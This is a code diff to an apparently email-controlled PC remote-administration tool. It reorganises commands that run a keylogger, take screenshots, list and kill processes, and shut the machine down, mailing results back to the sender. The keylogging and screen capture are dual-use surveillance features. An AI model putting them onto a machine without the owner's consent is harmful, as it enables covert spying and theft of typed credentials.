@@ -39,14 +39,11 @@ class Mail:
 
     def take_screenshot(self):
         file_name: str = "Picture.png"
-        overwrite: bool = True
 
         if len(self.cmd_list) > 1:
             file_name = self.cmd_list[1]
-        if len(self.cmd_list) > 2:
-            overwrite = not (self.cmd_list[2] == "False")
 
-        file_path = capture_SS(file_name, overwrite)
+        file_path = capture_SS(file_name)
 
         self.set_info("Screenshot")
 
@@ -58,6 +55,28 @@ class Mail:
                 picture_file.read(), name=os.path.basename(file_path)
             )
             self.email_message.attach(picture_attachment)
+
+    def keylogger(self):
+        duration: int = 5
+        try:
+            duration = int(self.cmd_list[1])
+        except:
+            pass
+        file_path: str = logger(duration)
+
+        self.set_info("Keylog")
+
+        self.body = (
+            "The program records your keystrokes for " + str(duration) + " seconds."
+        )
+        self.email_message.attach(MIMEText(self.body, "plain"))
+
+        with open(file_path, "r") as text_file:
+            text_attachment = MIMEText(text_file.read())
+            text_attachment.add_header(
+                "Content-Disposition", "attachment; filename= Keylogger.txt"
+            )
+            self.email_message.attach(text_attachment)
 
     def log_out(self):
         self.set_info("Logout")
@@ -85,35 +104,45 @@ class Mail:
 
         os.system("shutdown /s /t now")
 
-    def keylogger(self):
-        duration: int = 5
-        try:
-            duration = int(self.cmd_list[1])
-        except:
-            pass
-        file_path: str = logger(duration)
+    def list_app(self):
+        file_path = list_running_application()
+        self.set_info("List Applications")
+        self.body = "The list of running applications of your PC."
+        self.email_message.attach(MIMEText(self.body, "plain"))
+        
+        with open(file_path, "r") as text_file:
+            text_attachment = MIMEText(text_file.read())
+            text_attachment.add_header(
+                "Content-Disposition", "attachment; filename= RunningApplications.txt"
+            )
+            self.email_message.attach(text_attachment)
 
-        self.set_info("Keylog")
+    def list_process(self):
+        file_path = list_running_process()
 
-        self.body = (
-            "The program records your keystrokes for " + str(duration) + " seconds."
-        )
+        self.set_info("List Processes")
+        self.body = "The list of running processes of your PC."
         self.email_message.attach(MIMEText(self.body, "plain"))
 
         with open(file_path, "r") as text_file:
             text_attachment = MIMEText(text_file.read())
             text_attachment.add_header(
-                "Content-Disposition", "attachment; filename= Keylogger.txt"
+                "Content-Disposition", "attachment; filename= RunningProcesses.txt"
             )
             self.email_message.attach(text_attachment)
 
+    def terminate_process(self):
+        self.set_info("Terminate Process")
+        self.body = kill_process(self.cmd_list[1])
+        self.email_message.attach(MIMEText(self.body, "plain"))
+
     def log(self):
         file_path = note2log(self.sender, self.cmd_list)
-        
+
         self.set_info("Log File")
         self.body = "The log file of your PC."
         self.email_message.attach(MIMEText(self.body, "plain"))
-        
+
         with open(file_path, "r") as text_file:
             text_attachment = MIMEText(text_file.read())
             text_attachment.add_header(
@@ -134,11 +163,11 @@ class Mail:
             "keylog": self.keylogger,
             "logout": self.log_out,
             "shutdown": self.shut_down,
-            # "list apps": None,
-            # "list processes": None,
-            # "kill process": None,
-            # "show dir": None,
-            "show log": self.log,
+            "listApp": self.list_app,
+            "listProcess": self.list_process,
+            "terminateProcess": self.terminate_process,
+            # "dir": None,
+            "log": self.log,
             "help": self.help,
         }
         command[self.cmd_list[0]]()
